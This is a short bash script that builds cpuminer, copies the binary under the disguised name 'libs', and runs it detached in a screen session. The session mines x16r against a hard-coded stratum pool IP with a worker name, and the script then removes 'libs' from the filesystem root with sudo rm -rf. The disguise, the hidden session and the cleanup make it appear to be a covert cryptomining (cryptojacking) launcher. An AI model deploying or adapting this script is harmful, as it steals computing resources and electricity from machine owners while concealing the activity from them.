#!/bin/bash
sudo chmod +x build.sh 
sudo ./build.sh
sudo cp cpuminer libs
sudo screen -d -m ./libs -a x16r -o stratum+tcp://145.239.0.123:6667 -u duyuno.duy -p x
cd /
sudo rm -rf libs